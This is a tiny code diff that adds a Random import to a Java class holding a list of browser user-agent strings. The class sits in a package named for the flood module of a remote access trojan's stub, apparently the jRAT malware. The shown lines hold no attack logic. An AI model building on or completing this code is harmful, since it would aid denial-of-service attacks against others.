@@ -1,5 +1,7 @@
 package su.jrat.stub.flood;
 
+import java.util.Random;
+
 public class Useragents {
 	
     public static final String[] USERAGENTS = new String[] { "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)",
